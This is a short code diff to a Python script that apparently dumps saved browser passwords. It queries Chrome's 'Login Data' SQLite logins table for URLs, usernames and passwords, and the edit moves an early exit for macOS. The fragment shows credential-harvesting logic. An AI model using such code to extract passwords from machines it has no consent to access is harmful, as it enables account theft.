@@ -1,4 +1,4 @@
-import os
+import os,sys
 import sqlite3
 try:
     import win32crypt
@@ -25,6 +25,9 @@ def main():
         connection = sqlite3.connect(path + "Login Data")
         cursor = connection.cursor()
         v = cursor.execute('SELECT action_url, username_value, password_value FROM logins')
+        if (os.name == "posix") and (sys.platform == "darwin"):
+                print("Mac OSX not supported.")
+                sys.exit(0)
 
         value = v.fetchall()
         for information in value:
@@ -37,8 +40,7 @@ def main():
                         'password': str(password)
                     })
 
-            elif (os.name == "posix") and (sys.platform == "darwin"):
-                return "Mac OSX currently not supported."
+            
 
             elif os.name == 'posix':
                 info_list.append({
